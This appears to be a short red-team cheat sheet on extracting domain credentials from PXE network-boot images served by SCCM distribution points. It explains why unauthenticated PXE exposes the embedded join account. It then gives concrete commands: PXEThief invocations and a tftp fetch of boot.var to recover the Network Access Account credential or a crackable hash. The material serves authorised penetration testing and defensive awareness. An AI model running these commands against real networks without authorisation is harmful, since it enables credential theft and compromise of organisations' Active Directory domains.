# PXE Credential Extraction

Network boot infrastructure serves a boot image that has to be able to join the domain on its own. Whatever credential does the joining is embedded in the image, and the image is served to anyone who asks for it.

## Why It Works

PXE is unauthenticated by design — the client has no identity yet. Deployment images therefore carry either a plaintext or a recoverable domain join account, and password-protected images use a key that is itself crackable.

## Prerequisites

* A reachable PXE/TFTP distribution point
* No credentials required

## Execution

**PXE**

* no password
  * `pxethief.py 1` [\[tool\]](https://github.com/MWR-CyberSec/PXEThief)
  * `pxethief.py 2 <distribution_point_ip>` [\[tool\]](https://github.com/MWR-CyberSec/PXEThief)
    * **→ Credentials (NAA account)**
* password protected
  * `tftp -i <dp_ip> GET "\xxx\boot.var"` [\[tool\]](https://linux.die.net/man/1/tftp)
    * **→ PXE Hash**
  * `pxethief.py 5 '\xxx\boot.var'` [\[tool\]](https://github.com/MWR-CyberSec/PXEThief)

## Related

* [Hash Cracking Reference](file:///9685693/credential-access/hash-cracking-reference.md) — the `$sccm$aes128$` format
* [SCCM Recon](file:///9685693/sccm/sccm-recon.md) — PXE is usually an SCCM distribution point
